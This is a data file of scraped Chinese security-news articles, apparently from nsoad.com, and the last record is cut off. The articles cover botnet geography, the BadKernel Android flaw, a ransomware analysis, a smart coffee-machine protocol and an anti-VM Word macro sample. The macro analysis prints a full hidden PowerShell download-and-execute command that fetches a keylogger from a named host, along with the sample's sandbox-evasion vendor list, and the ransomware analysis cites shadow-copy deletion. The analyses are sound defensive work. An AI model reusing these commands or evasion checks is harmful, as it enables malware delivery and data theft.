"5ccbfa264f2f0a0a7a69c024","这两年的DDoS攻击大概每分钟都在发生，类似vDOS这样攻击服务都发展得相当火热。发起这类攻击的基础就是打造僵尸网络，感染网络中的大量设备，让这些设备成为肉鸡，这样才能发起强有力的DDoS攻击。","Kong","这两年的DDoS攻击大概每分钟都在发生，类似vDOS这样攻击服务都发展得相当火热。发起这类攻击的基础就是打造僵尸网络，感染网络中的大量设备，让这些设备成为肉鸡，这样才能发起强有力的DDoS攻击。           那么全球哪些地区会是僵尸网络的重灾区呢？赛门铁克最近就此发起了一项有趣的调查，从僵尸网络设备数量和僵尸网络设备密度两个维度观察，到底哪些国家和地区的僵尸网络最严重。结果显示土耳其、意大利、匈牙利等地成为重灾区。    网络犯罪与地理位置存在相关性，这并不稀奇。网络犯罪组织总是能够根据不同国家，采用不同的策略，提供不同的产品和服务。比如说，俄罗斯网络犯罪组织专司银行卡信息贩卖、提供黑客服务；中国网络犯罪组织主攻手机；而巴西的黑客则在银行木马方面造诣颇深…今天，笔者将展示赛门铁克针对僵尸网路蔓延的研究结果。首先强调几点：僵尸网络所在地并不代表控制设施所在地，也不代表相关犯罪组织居住地。赛门铁克：下面这张地图揭示了2015年，欧洲、中东和非洲地区的哪些国家与城市拥有最多的僵尸设备（包括PC、Mac、智能手机、平板电脑及联网家用终端等）。排名、表格及百分比均根据各国及各城市的总僵尸设备数量计算得出。“僵尸设备密度”是将某国家或城市的僵尸设备数量与其互联网用户总数相比较：具体计算方法是将2015年给定国家或城市中检测到的僵尸设备总数，除以该地的互联网用户数量（由互联网数据中心于2016年9月20日统计）。互动地图，点击查看所有数据赛门铁克专家发现土耳其的僵尸设备数量最为庞大（占欧洲、中东和非洲地区总量的18.5%）。在欧洲、中东和非洲地区城市中，伊斯坦布尔及土耳其首都安卡拉拥有最多受僵尸网络控制的设备。数据表明，这两个城市的僵尸设备数量占据整个欧洲、中东和非洲地区总量的三分之二，其中伊斯坦布尔占了29%，而安卡拉占了28%。意大利也深受其害，位居第二（占欧洲、中东和非洲地区总量的9.8%），匈牙利紧随其后，排在第三位（占欧洲、中东和非洲地区总量的9.1%）；在受调城市中，罗马的僵尸设备数量在众城市中排名第三，布达佩斯和塞格德紧随其后。     僵尸设备总数前10城市                     僵尸设备总数前10国家                     僵尸设备密度前10国家                 1    伊斯坦布尔（土耳其）                     土耳其    匈牙利2    安卡拉（土耳其）                     意大利    摩纳哥3    罗马（意大利）                     匈牙利    安道尔4    布达佩斯（匈牙利）                     德国    以色列5    塞格德（匈牙利）                     法国    土耳其6    莫斯科（俄罗斯）                     西班牙    拉脱维亚7    佩塔提克瓦（以色列）                     英国    科威特8    马德里（西班牙）                     波兰    意大利9    巴黎（法国）                     俄罗斯    塞浦路斯10    伦敦（英国）                     以色列    波兰僵尸网络形成之后，对许多犯罪组织而言，就成为了赚钱的工具——可以贩卖，也可以租赁。这些组织可以利用僵尸网络，进行许多非法活动，诸如DDoS攻击及垃圾邮件攻击。在当代案例中，受感染的IoT物联网设备（比如监控摄像头、路由器、猫及传感器设备）是组成僵尸网络的主力军，被越来越多的攻击者利用以发起强有力的攻击。除了上述绝对数量，僵尸网络设备密度也是个重要属性：匈牙利的僵尸设备密度最大，每393名匈牙利互联网用户中就有1人的设备受感染，其他国家的数据如下：摩纳哥（1/457），安道尔（1/591），以色列（1/809），土耳其（1/1139），拉脱维亚（1/1240），意大利（1/1829），塞浦路斯（1/2283），波兰（1/2300）。","2016-10-11 15:05:00","网络安全","僵尸网络的全球分布图原来是这样的……","http://nsoad.com/Article/Network-security/20161011/524.html"
"5ccbfa2f4f2f0a0a7a69c025","根据国外媒体的最新报道，安全研究专家在Google的V8 JavaScript引擎中发现了一个安全漏洞（BadKernel），该漏洞将会间接影响到Android智能手机的安全性。据估算，每十六台Android手机中，就会有一台受到Ba","Kong","根据国外媒体的最新报道，安全研究专家在Google的V8 JavaScript引擎中发现了一个安全漏洞（BadKernel），该漏洞将会间接影响到Android智能手机的安全性。据估算，每十六台Android手机中，就会有一台受到BadKernel漏洞的影响。不仅如此，目前大部分热门手机中都存在这个漏洞，例如LG、三星、摩托罗拉和华为等。漏洞情况实际上，安全研究专家在很久以前就发现了这个漏洞，并且这个漏洞在2015年的夏天也已经得到了修复。根据安全研究专家透露的信息，这个漏洞可以影响v3.20至v4.2版本的GoogleV8 JavaScript引擎。尽管这个漏洞在一年多以前就已经被曝光了，但是在2016年的8月份，中国的安全研究专家们发现，如果运行了Android操作系统的设备部署了旧版本的V8引擎，那么这些设备的安全性仍然会受到该漏洞的影响。漏洞利用来自360的安全研究专家发现，如果目标设备中部署了包含漏洞的V8引擎，那么在2015年的那个V8引擎漏洞的帮助下，他们就可以利用包含漏洞的应用APP来在目标Android设备中执行恶意代码。值得注意的是，就漏洞的利用难度而言，BadKernel漏洞与Stagefright差不多，该漏洞的利用过程同样非常的简单。这个名为BadKernel的漏洞将允许攻击者从用户的Android设备中窃取隐私数据，获取到用户摄像头的控制权，并且截获短信消息。当然了，攻击者能做的当然不仅仅只有这些，他们几乎可以从目标设备中获取到任何他们想要的数据。由于这个漏洞属于远程代码执行（RCE）漏洞，攻击者如果能够成功利用这个漏洞，那么他们就可以获取到目标Android智能手机的完整控制权。因为攻击者只需要通过在Web页面中加载恶意内容便可以利用BadKernel漏洞实施攻击，所以攻击者在利用漏洞的过程中并不会遇到太大的困难。受影响的APP根据安全研究专家的推测，BadKernel漏洞将会影响大量其他的移动应用。Google在Chromium移动浏览器框架中部署了V8引擎，并且Chrome和Opera等移动端Web浏览器都使用了这一框架。不仅如此，Android的WebView组件中同样配置了V8引擎。移动开发人员可以在他们的应用程序中使用WebView组件，从而实现在应用程序中直接查看Web内容。目前，像微信、Facebook、Twitter、以及Gmail这样的热门应用都会使用WebView组件。而需要注意的是，从Android4.4.4到5.1版本的操作系统其默认自带的WebView组件中都包含有该漏洞。除此之外，有些软件开发工具包（SDK）中同样部署了自定义的V8引擎，例如TencentX5.SDK，而这些自定义的V8引擎中几乎都包含有BadKernel漏洞。这也就意味着，使用这些SDK所开发出来的应用程序同样会受到BadKernel漏洞的影响。不幸的是，这些受影响的应用程序基本上都是来自中国的移动端APP，例如QQ、QQ空间、京东客户端、58同城、搜狐新闻、以及新浪新闻等等。安全研究专家表示，目前仍然有大量长时间未更新的APP仍在使用包含漏洞的WebView组件。虽然最新的V8JavaScript引擎版本为v5.1，但是目前仍然有很多应用程序使用的是包含漏洞的V8引擎。这些“过期”的应用程序之所以会存在，要么是因为开发人员的懈怠，要么就是因为用户没有对这些程序进行更新。尽管该漏洞在2016年的8月份就已经被曝光了，但是在这篇文章发稿之前，BadKernel漏洞仍然没有得到其应有的关注度。Trustlook移动安全公司的ClarkDong在一封写给Softpedia的电子邮件中表示：“由于BadKernel漏洞最初是由奇虎360公司的安全研究团队所发现的，而针对该漏洞的初始研究报告也是用中文写的，但是中文的漏洞报告对于其他国家的安全研究专家而言并不是那么好理解，所以这也就导致了美国和欧洲的安全研究人员对该漏洞的信息所知甚少。”所有主要的智能手机供应商都会受到BadKernel漏洞的影响Clark Dong所在的公司已经将目前受BadKernel漏洞影响的智能手机型号、Android操作系统版本、以及Web浏览器版本做成了一份列表并公布出来了【点我获取】。这份列表中包含目前大部分的大型厂商，从Alcatel到HTC，从联想到索尼，这里只是简单的列举了一二。Trustlook是一家专注于为Android移动设备提供反病毒解决方案的公司，Trustlook的安全研究人员利用遥测数据来从客户设备中收集到了一些统计分析数据，并根据这些数据来估计出目前受影响的用户总量。该公司表示，目前大约有41.48%的三星智能手机会受到BadKernel漏洞的影响。不仅如此，市场上有38.89%的华为智能手机同样会受到该漏洞的影响。除此之外，还有26.67%的摩托罗拉手机和21.93%的LG手机也会受到BadKernel漏洞的影响。但是安全研究专家表示，受该漏洞影响最为严重的国家当属秘鲁，在秘鲁平均每五台Android智能手机中就有一台存在BadKernel漏洞。受影响程度排在秘鲁之后的国家依次为法国（14.7%）、尼日利亚（12.4%）、孟加拉（10.2%）和泰国（9.4%）。四分之三的LG手机其内置浏览器中存在BadKernel漏洞相同的遥测数据表明，受此漏洞影响最为严重的移动端浏览器是LG的内置Web浏览器（75%），其次是三星手机的内置浏览器（41%）。除了上述两款浏览器之外，第三方移动浏览器GoogleChrome也会受到该漏洞的影响（11%）。总结为了避免自己的智能手机受到BadKernel攻击，用户应该及时更新移动设备中的应用程序。更重要的是，当供应商向用户推送了Android操作系统更新包时，用户应该尽量避免推迟安装或拒绝安装这类更新。用户可以通过访问Trustlook的官方网站来查看自己的智能手机是否会受到该漏洞的影响。除此之外，用户也可以安装一个专门针对BadKernel漏洞的安全扫描程序来检测设备的安全性【点我下载】。安装视频教程如下：https://www.youtube.com/watch?v=GyvzxE-g2Y0","2016-10-09 11:22:27","网络安全","每16台Android手机中，就有一台受BadKernel漏洞的影响","http://nsoad.com/Article/Network-security/20161009/502.html"
"5ccbfa304f2f0a0a7a69c026","对于一个“正经”的黑产从业者来说，利益最大化是他所追求的目标，而利益最大化的实现无非需要两个方面来支撑，一是成本最小化，二是收入最大化。当然，那些制作、传播敲诈者木马的黑产从业者也深谙此道。","silence","前言对于一个“正经”的黑产从业者来说，利益最大化是他所追求的目标，而利益最大化的实现无非需要两个方面来支撑，一是成本最小化，二是收入最大化。当然，那些制作、传播敲诈者木马的黑产从业者也深谙此道。为了实现成本最小化，这些黑客们抛弃了以前繁琐的开发模式，有的开始转战拥有庞大类库的.NET平台，有的则摈弃繁杂的程序加壳和混淆，直接以“裸体”的文件加密代码示众；而实现收入最大化呢，多勒索几个比特币显得不够“绅士”，那就只能耍一些花招来增加用户被勒索的可能性了。最近，360互联网安全中心就捕获到多枚进行“花式敲诈”的敲诈者木马，其敲诈手段可谓无所不用其极，下面将具体分析三种敲诈者木马是怎么“耍花招”的。加密手法分析在对这些“花招”进行分析之前，还是需要对这三款“敲诈者”木马的加密手法进行简要叙述。这几款木马所使用的编程语言为C#和C++，用C#编写的“敲诈者”木马受益于.NET平台下强大的加密类库，因此直接使用相关加密函数即可完成加密工作。图1 产生随机数密钥图2 用RSA公钥加密随机数密钥图3 用随机数密钥加密文件上面三幅图是.NET平台下“Fantom”敲诈者木马的加密方法，此种加密方法和一般的敲诈者木马相似，使用RSA公钥去加密随机数密钥，然后用随机数密钥去加密文件（也有的使用AES加密算法加密文件）。其他类型的敲诈者木马使用的加密方法大同小异，只是在密钥的处理上有些不同。而对于使用c++编写的敲诈者木马而言，使用现成的公开库也是可以解决加密的问题，只是相比较.NET平台还是略显臃肿。图4  c++编写的“敲诈者”木马部分加密算法“花招”的具体分析当然，刚刚那些只是“前戏”，分析这几款敲诈者木马所耍的“花招”才是正事。这些敲诈者木马耍花招的目的有的是让用户更容易上当受骗，有的是增加用户对敲诈勒索的恐惧感，还有的直接简化了支付的流程，可谓是”花样百出”。不过，“花招”的目的都是一致的-——“多捞钱”。那么，它们耍的花招到底都有哪些亮点呢？“Fantom”敲诈者木马“Fantom”敲诈者木马是基于.NET平台的敲诈者木马，其加密手法之前已经进行了介绍，那么，这款“敲诈者”木马到底耍了啥花招呢？我们可以从代码中看出点端倪。由于程序的主要功能是以窗口事件处理的形式执行的，为了不让用户察觉到蛛丝马迹，程序把窗口的图标和任务栏图标都隐藏起来。图5 隐藏图标和任务栏图标当然这不是重点，重点在程序资源段中一个名为“WindowsUpdate.exe”的程序。程序通过extractResource方法将该程序复制到临时文件夹下执行。图6 从资源段获取程序并执行从程序名可以看出，这应该是个和Windows更新有关的程序，果然，反编译代码证实了这一点，这是个伪造的windows更新界面！该程序窗口布局是仿造windows更新界面绘制而成的，并且覆盖整个屏幕。为了达到动态效果，程序以窗口事件处理程序的形式增加了一个定时器，以100秒为间隔修改更新进度。因此进度达到百分之百需要大约要两个半小时，这时间足够完成加密工作。图7 程序以100秒为间隔修改更新进度借助C#强大的窗体绘制能力，程序绘制出了一个“以假乱真”的Windows更新界面。图8 伪造的Windows更新界面当然，仅仅依靠这样一个覆盖全屏的窗口界面还是不能令作者满意的，因此作者为这个伪造界面添加了许多“左膀右臂”，比如禁止打开任务管理器。图9 禁止打开任务管理器当受害者的计算机屏幕上覆盖着这样一个伪造的Windows更新界面时，由于无法打开任务管理器，受害者也就无法关闭产生该界面的程序。实际上更多的情况是，受害者根本不知道这是一个伪装的Windows更新程序，而会把所见的当作真正的Windows更新界面。 等到加密工作完成之后，加密程序就结束掉产生伪造Windows更新界面的程序。图10 结束掉伪造Windows更新进程当受害者以为自己计算机系统已经更新完毕时，也正是悲剧来临之时。计算机中大部分文件将被加上“fantom”后缀名，而显示在用户面前的是一封显眼的勒索信。原本以为系统更新成功，结果才发现一切都是个骗局。图11 勒索信内容 图12 被加密的文件作者在每个文件夹下都留有一个html网页，上面介绍如何支付赎金恢复文件。图13 介绍支付流程的html网页 图14 网页内容是不是到此程序就结束它的“勒索“之行坐等收赎金了呢？并不是这样的，为了防止用户通过卷影备份恢复数据，程序调用“Vssadmin delete shadows”命令删除计算机中的卷影，可谓“赶尽杀绝”。图15 删除卷影防止通过备份恢复数据可以看出，“Fantom”敲诈者木马充分利用了C#语言绘制窗体的方便性，绘制了一个栩栩如生的伪造Windows更新界面，这以假乱真的功夫简直6翻了。“Voldemont”敲诈者木马不同于 “Fantom”敲诈者木马所走的专业山寨路线，“Voldemont”可谓另辟蹊径，没有勒索信，也不让你看到那一大堆被加密的文件，在你面前只有这么一张图。图16 “Voldement”敲诈者展示的界面一个伏地魔的照片突然就出现在面前，着实有些吓人。不过还有一个更吓人的，就是这款敲诈者木马不勒索比特币，而是直接要你把信用卡发给他，这明摆着就是抢劫嘛！可能有些用户在此时会选择通过任务管理器关闭相关程序或者重启计算机，不过悲剧的是，程序已经结束掉explore进程和任务管理器进程并且写入启动项，下回开机时还要被吓一次，无计可施的用户不得不输入信用卡信息来寻求解密。  图17 程序结束explore和taskmgr进程图18 程序写注册表启动项当受害用户填写信用卡信息并点击“Get Key！”时，程序就会将信用卡信息发送至远程服务端。图19 发送信用卡信息到远程服务端远程端会核实信息是否正确，正确的话将会发送一个key到本地客户端。图20 判断信用卡信息是否正确以选择要执行的代码按说接收到的key应该是用于解密文件的，然而事实并非如此，程序并不是使用这个key对文件进行解密，只是用它来判断是不是可以进行解密了，而且判断条件也仅仅是个简单的运算。图21 解密的判断可以看出，解密算法并不需要key的参与，也就是说加密算法即解密算法，从算法的代码中也可以很清楚的看出，这是个加解密通用的算法。看来“伏地魔”的功力也不过如此，除了会吓人，也没啥亮点了。图22 部分加/解密代码相比较“Fantom”木马缜密的加密流程以及无可匹敌的山寨功力，“Voldemont”也就仅仅起到了吓人的作用，并没有一般“敲诈者”木马不可逆的加密手段，只要弄清“Voldemont”的加密手法就能让它功力尽失。“QrCode”敲诈者木马之所以叫它“QrCode”，因为这是个关于二维码的故事。“QrCode”敲诈者也是基于.NET平台，它在函数命名以及加密方式方面和“Fantom”有较多相似之处，不排除是同一团伙所为。而且相比较“Fantom”敲诈者，“QrCode”在加密流程上更为缜密，而且将加解密钥的存储全部转移到了远程服务端，可以说更加隐蔽。图23 “QrCode”加解密流程从上图可以看出，本地程序和服务端进行交互，向服务端发送本地相关信息，而服务端通过判断这些信息来决定是进行加密还是解密，而加密和解密使用的密钥也是由服务端提供的，分别是FIRST字段下的值和RECEIVED字段下的值。除外，为了防止杀软检测程序对一些敏感信息的获取，该款“敲诈者”并没有获取诸如计算机名等较为敏感的信息，而是获取一些可以代表机器但不是那么敏感的信息，比如ProductName，CDVersion，作者也“亲切”地称他们“FriendlyName”。图24 获取“FrienflyName”这些信息上传到服务端后将作为标识受害计算机所用的信息，作者通过多次从本地获取这些信息来和服务端做对比来确定受害者是否支付赎金亦或者这是台初次感染的机器。那么，受害者该怎么交付赎金呢？在代码中可以发现一个名为.CreateQrCode的函数，难道要通过扫二维码支付赎金？图25 创建二维码函数果不其然，屏幕出现了一个大大的二维码，不过扫描该二维码只是获得比特币钱包地址和支付金额。 图26 感染“QrCode”敲诈者后的界面由于二维码的生成使用了谷歌的接口，因此有些国内用户感染该木马后并不会产生二维码，不过屏幕依然会出现对方的比特币钱包地址。该“敲诈者”会向受害者勒索1.5个比特币，而且要求受害者在十分钟内完成支付。这时候受害者应该也会选择启动任务管理器结束相关进程或者重启，不过同样悲剧的是，程序禁止打开任务管理器并且设置了启动项。图27 设置开机启动项图28 禁止使用任务管理器“QrCode”敲诈者木马禁止任务管理器的函数和“Fantom”木马完全相同，除此之外获取计算机所在国家语言的函数也和“Fantom”敲诈者完全相同，因此可以基本确定两者来自同一团伙。不过“QrCode”敲诈者木马最大的亮点还是来自于那个大大的二维码，虽然这个二维码并不带“扫一扫即可支付”的功能，只是用于提供比特币钱包地址和支付金额，但从这种接地气的设计来看，敲诈者木马离“扫一扫即可支付”不远了。总结从分析中可以看出，这几款“敲诈者”威力虽然参差不齐，但由于使用了各种各样的“花招”来迷惑和恐吓用户，并且简化了支付流程，因此它们的能力还是不容小觑。在敲诈者木马多样化的今天，用户在下载运行未知程序时保持警惕状态，对于具有迷惑性的程序更应该“慎点”。面对敲诈者木马多样化的趋势，360安全卫士已经开通了“反勒索服务”，并向用户公开承诺：使用360安全卫士11.0版本并开启该服务后，一旦感染敲诈者病毒，360将提供最高3个比特币（约13000元人民币）的赎金并帮助用户回复数据，让用户远离财物及文档的损失。","2016-10-11 17:23:17","系统安全","揭秘花招最多的三种敲诈者木马","http://nsoad.com/Article/system/20161011/529.html"
"5ccbfa304f2f0a0a7a69c027","我个人非常喜欢喝咖啡，说实话，我估计我每周都要喝好掉几升的咖啡…我不仅是一名黑客，而且我还是一个名副其实的极客。于是乎，就在几天之前，爱喝咖啡的我果断在亚马逊商城买了一台智能咖啡机，也算是赶","blackhold","前言我个人非常喜欢喝咖啡，说实话，我估计我每周都要喝好掉几升的咖啡…我不仅是一名黑客，而且我还是一个名副其实的极客。于是乎，就在几天之前，爱喝咖啡的我果断在亚马逊商城买了一台智能咖啡机，也算是赶了一把智能家居的热潮。这是由智能设备制造商Smarter所推出的一款带有Wi-Fi功能的智能咖啡机，当这台咖啡机连上了你家的Wi-Fi之后，你就可以用手机客户端来控制它了。别担心，Smarter 很贴心地为Android用户和苹果用户提供了相应的客户端。你可以设想这样一种场景：当你辛苦工作了一天，一回到家就有杯热腾腾的咖啡在那里等着你了，这是一种什么样的体验？Smarter智能咖啡机就可以做到这一点。如果你不了解这款智能咖啡机的话，可以访问其官网以了解详细的信息[传送门]。安装了相应的app之后你就会发现，这款智能咖啡机所配备的App设计得非常棒。在App的帮助下，你可以直接设置咖啡的杯数和浓度，然后按下手机中的按钮，接下来你就可以摊在沙发上等着热腾腾的咖啡“出炉”了。因为通常情况下我都是在家工作的，所以我使用电脑键盘的时间多过我使用智能手机的时间。因此，我就感觉对于手机App而言，命令行客户端貌似更加适合我一些。但是现实和理想总是有差距的，厂商当然不会提供这样的工具给我们。所以，我就打算对咖啡机的Android端应用程序进行逆向分析，然后深入了解一下它所使用的网络通信协议，并为实现我自己的客户端做好准备工作。你猜怎么着？没错！在经过了一番折腾之后，我终于可以用终端来控制我家的智能咖啡机了。对通信协议进行逆向分析相比对iOS应用进行逆向分析，Android应用的逆向分析过程要相对简单一些，所以我才选择从咖啡机的Android端应用入手[App点我获取]。下载好apk文件之后，我要先对文件进行反汇编，然后才可以开始研究源代码中的各个类和方法。于是我打开了JADX（使用参数--show-bad-code），然后在CTAGS（一款方便代码阅读的工具）的帮助下开始对输出的源代码进行分析。几个小时过后，我发现了一个非常有趣的类（am.smarter.smarterandroid.models.a），在这个类中有几个方法引起了我的注意，具体如下图所示：这些数据全部都会被发送至智能咖啡机的TCP端口2081，而且咖啡机所采用的网络通信协议也十分简单。第一个字节：命令数；第二个字节至N：可选数据，具体将取决于命令代码；最后一个字节：永远为0x7e，它代表的是数据的结尾；不同的命令会使响应信息发生一些变化，但是对于大多数控制命令而言，响应信息的形式基本如下：第一个字节：响应信息的大小；第二个字节：状态码（0=成功，其他即为错误代码）；最后一个字节：永远为0x7e；我在下方给大家提供了一个例子，这是一个控制命令和其对应的响应信息。这个控制命令可以让咖啡保温五分钟，具体如下所示：命令：0x3e 0x05 0x7e响应：0x03 0x00 0x7e于是，为了编写出我的终端控制程序并对其进行功能测试，我已经将咖啡机所有的控制命令全部映射出来了…为了更好地给大家展示我的努力成果，我专门录制了一个视频。我不得不说，这玩意儿简直棒极了！演示视频： 如果你感兴趣的话，你也可以自行动手尝试一下，毕竟实践才能出真知嘛！但是请注意，第一次运行时你需要指定设备的IP地址，你的配置数据将会保存在~/.smartercoffee文件中，此后你就无需再进行配置了。[点我获取工具源码]配置IP地址的命令样例如下所示：coffee make -A 192.168.1.50一些简单的控制命令制作一杯咖啡：coffee make制作两杯咖啡，并且使用过滤器过滤掉研磨机中的咖啡豆渣：coffee make –filter咖啡保温十分钟：coffee warm --keep-warm=10完整使用手册：☕ ☕ ☕  SmarterCoffee Client ☕ ☕ ☕by Simone 'evilsocket' MargaritelliUsage: coffee [options] (make|warm)Options:  -h, --help                           显示帮助信息  -A ADDRESS, --address=ADDRESS      设置Smarter智能咖啡机的IP地址  -M, --make                          制作咖啡  -W, --warm                         咖啡保温  -C CUPS, --cups=CUPS                设置咖啡杯数  -S STRENGTH, --strength=STRENGTH   设置咖啡浓度（0-2）  -G, --grind                          使用研磨功能  -F, --filter                           使用过滤功能  -K TIME, --keep-warm=TIME          设置咖啡保温时间站在安全的角度进行考虑虽然用户在使用咖啡机的App时需要注册一个账号，但是端口2081的访问完全没有受到任何的限制，任何未经过身份验证的操作者都可以直接访问这个端口。而且我还发现，用户账号只是用来收集一些统计数据的。这也就意味着，任何处于同一网络中的人都可以直接访问并控制你的咖啡机。除此之外，我还对UPDATE_FIRMWARE包中的代码进行了逆向分析，我发现在更新咖啡机固件的时候，系统同样不会对操作者的身份进行验证。不过厂商请放心，我是不会在报告中公开讨论这部分内容的。","2016-10-11 15:20:26","系统安全","看我如何利用终端来让智能咖啡机制作出美味的咖啡","http://nsoad.com/Article/system/20161011/528.html"
"5ccbfa304f2f0a0a7a69c028","最近，我分析到一个行为异常的恶意软件样本。由于很难发现该恶意软件的真实行为，所以我花了很多时间去调试分析。然而在分析过程中，又有多种因素会导致运行崩溃和异常。在此，我就发表了对该恶意软件反虚","silence","最近，我分析到一个行为异常的恶意软件样本。由于很难发现该恶意软件的真实行为，所以我花了很多时间去调试分析。然而在分析过程中，又有多种因素会导致运行崩溃和异常。在此，我就发表了对该恶意软件反虚拟机的一些技术。样本信息恶意软件样本文件名为“Intelligent Software Solutions Inc.doc“，其SHA256值为：048fc07fb94a74990d2d2b8e92c099f3f986af185c32d74c857b07f7fcce7f8e以下是样本文件打开运行时的示例：如果这看起来不太可疑，请看其代码视图：这是一个经典的教科书式的WORD恶意软件，它没有实质内容，但包括了经过混淆的可执行代码，看上去非常简洁。分析调查从代码层面来看，顶部的分支程序像是程序的执行入口，很有可能是当WORD文档被打开后，点击“enable contenet” 执行Active X控件的操作，最终，程序会排错调用IuIxpP子程序。技巧：在子程序 IuIxpP中，分别调用了两个方法DKTxHE 和 qrNjY，并抛出不同的执行错误。其中，DKTxHE 功能为：RecentFiles对象表示系统最近打开过的历史文档。通常，安装了word程序的用户可能会打开超过2个或更多数量的文档。然而，当该恶意软件植入到新创建的虚拟机和word环境中后，总是状况不断，不能正常运行。每次测试时手动打开一两次，总是出现程序异常。即使是保存了虚拟机镜像状态，重启调试分析后，恶意程序仍然不能正常执行。从DKTxHE函数功能可以看出，恶意软件以RecentFiles数量来判断是否身处VM环境中，如果在VM环境中，它将不会执行任何恶意行为，非常“聪明”。之后，我随意创建了3个不同名称的word文档，逐一打开并关闭，让历史文档数量为3，最终成功运行并检测到了恶意软件。原因很明了，虚拟机环境一般缺乏多个Word文档，恶意程序通过探测最近打开的历史文档数量，判断是否处于VM环境中，如果在最近打开文档数量内发现只有3个以下的word文档，就会拒绝执行。技巧：在另一个子程序 qrNjY中，恶意软件通过探测IP信息来识别VM环境。首先，它通过向远程地址发出某种认证请求，https://www.maxmind.com/geoip/v2.1/city/me之后设置请求信息中的HTTP Refer属性和User-Agent值，访问链接：https://www.maxmind.com/en/locate-my-ip-address以此获取宿主系统的地址信息，如：获取信息封装于JSON格式文件中，包含国家、城市、或者与IP相关的组织机构等信息。如：{  ""location"": {    ""latitude"": 30.7858,    ""longitude"": -102.1232,    ""metro_code"": 705,    ""accuracy_radius"": 5,    ""time_zone"": ""America/Los_Angeles""  },  ""continent"": {    ""names"": {      ""ja"": ""北アメリカ"",      ""pt-BR"": ""América do Norte"",      ""de"": ""Nordamerika"",      ""es"": ""Norteamérica"",      ""ru"": ""Северная Америка"",      ""fr"": ""Amérique du Nord"",      ""zh-CN"": ""北美洲"",      ""en"": ""North America""    },    ""code"": ""NA"",    ""geoname_id"": 6255149  },  ""city"": {    ""names"": {      ""pt-BR"": ""Oakland"",      ""de"": ""Oakland"",      ""es"": ""Oakland"",      ""ja"": ""オークランド"",      ""en"": ""Oakland"",      ""ru"": ""Окленд"",      ""fr"": ""Oakland"",      ""zh-CN"": ""奥克兰""    },    ""geoname_id"": 5378538  },  ""postal"": {    ""code"": ""94619""  },  ""country"": {    ""names"": {      ""ru"": ""США"",      ""fr"": ""états-Unis"",      ""zh-CN"": ""美国"",      ""en"": ""United States"",      ""ja"": ""アメリカ合衆国"",      ""es"": ""Estados Unidos"",      ""pt-BR"": ""Estados Unidos"",      ""de"": ""USA""    },    ""iso_code"": ""US"",    ""geoname_id"": 6252001  },  ""traits"": {    ""organization"": ""Comcast Cable"",    ""isp"": ""Comcast Cable"",    ""ip_address"": ""123.123.123.123"",    ""autonomous_system_organization"": ""Comcast Cable Communications, LLC"",    ""domain"": ""comcast.net"",    ""autonomous_system_number"": 7922  },  ""registered_country"": {    ""geoname_id"": 6252001,    ""names"": {      ""zh-CN"": ""美国"",      ""ru"": ""США"",      ""fr"": ""états-Unis"",      ""en"": ""United States"",      ""ja"": ""アメリカ合衆国"",      ""pt-BR"": ""Estados Unidos"",      ""de"": ""USA"",      ""es"": ""Estados Unidos""    },    ""iso_code"": ""US""  },  ""subdivisions"": [    {      ""geoname_id"": 5332921,      ""names"": {        ""ru"": ""Калифорния"",        ""fr"": ""Californie"",        ""zh-CN"": ""加利福尼亚州"",        ""en"": ""California"",        ""ja"": ""カリフォルニア州"",        ""pt-BR"": ""Califórnia"",        ""es"": ""California"",        ""de"": ""Kalifornien""      },      ""iso_code"": ""CA""    }  ]}在以上示例文件中，IP信息的organization字段显示为美国Comcast宽带网络供应商。恶意软件发出访问请求后，获取到宿主系统的相关信息将存储于某个数组中。如果获取到的组织机构名称与以下JSON文件中的任何机构字符串匹配，恶意软件将发生异常并停止运行。AmazonanonymousBitDefenderBlackOakComputersBlue CoatBlueCoatCiscocloudData CenterDataCenterDataCentrededicatedESET, SpolFireEyeForcePointFortinetHetznerhispeed.chhostedHostingIron PortIronPortLeaseWebMessageLabsMicrosoftMimeCastNForceOvh SasPalo AltoProofPointRackspacesecurityServerStrong TechnologiesTrend MicroTrendMicroTrustWaveVMVaultZscaler当然，上述列表中的机构名称在代码中是经过混淆的：以上信息表明，恶意程序通过检查，是否有网络服务商或杀毒软件公司相关的IP地址运行VM虚拟机对其进行调试分析，如果有，将停止运行。PAYLOAD如果恶意程序发现宿主系统有3个或以上的Word最近打开文档，将会执行远程下载解盘记录程序的PowerShell脚本：powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -command $f=[System.IO.Path]::GetTempFileName();(New-Object System.Net.WebClient).DownloadFile('http://silkflowersdecordesign.com/admin/worddata.dat', $f);(New-Object -com WScript.Shell).Exec($f)http://silkflowersdecordesign.com/admin/worddata.dat中涉及的worddata.dat是一个轻量级的键盘记录程序，SHA256为19d884d3b688abf8e284d3bc6a06817096d15592bcd73f85a0e4b79749f2a744。其它Researchers at Proofpoint 和Deepen Desai at zscaler两篇文章都对 anti-vm和anti-sandbox做了深入讨论，这些技术涉及到了不同种类的恶意软件，它们或许代表了VBA恶意软件的一种发展趋势。当然，看雪论坛的一篇经典文章《虚拟机检测技术剖析》，也是非常值得学习的。样本代码和文件分析：VirusTotal","2016-10-02 13:45:56","系统安全","这个恶意软件“奇葩”的反虚拟机技巧","http://nsoad.com/Article/system/20161002/473.html"
"5ccbfa304f2f0a0a7a69c029",,"blackhold","前言就在几周之前，一则关于“Dropbox攻击Mac OSX”的新闻出现在了在各大安全网站的头条上。当Mac用户安装好Dropbox之后，它便会要求你输入管理员密码，Dropbox会使用这个密码获取OSX的root访问权限，然后利用这种特殊权限来访问设备中的敏感信息。此次事件被曝光之后，广大网民均对Dropbox的这种行为嗤之以鼻。但尽管如此，我不得不告诉大家的是，Dropbox既没有利用任何系统漏洞，也没有破坏OSX的安全防御机制。当然了，当你得到了管理员密码之后，也就意味着你可以做任何你想做的事情了。如果这样就可以让你感到惊讶的话，那么我告诉你千万不要“惊讶”得太早，因为这里的确存在一个安全问题。其实在OSX平台中，Dropbox已经足够“仁至义尽”了。因为Dropbox完全不需要去要求用户输入管理员密码，它可以直接在你下一次完成某些需要管理员权限的设置时拦截到管理员密码。现在所有主流的桌面操作系统在默认配置下运行用户程序时，都会对应用程序的权限有所限制。当某些特定的应用程序需要以更高级的权限运行时，可以向系统申请获取这些权限。虽然从某种程度上来说，这些安全措施的确可以防止你在各类操作中无意间破坏系统中的重要组件，但是这样却无法将攻击者拦在门外。你要知道，任意一个所谓的非特权应用程序都拥有足够的权限去检测、拦截、篡改、或者劫持同一登录会话下的权限提升进程。在此之前，我曾使用过命令行工具来拦截密码。但是这一次，我打算在标准的OSX图形操作界面中实现密码拦截。Kcap程序的源代码我已经上传至Github中托管了，同学们可以点击［这里］获取。Kcap能做什么？OS 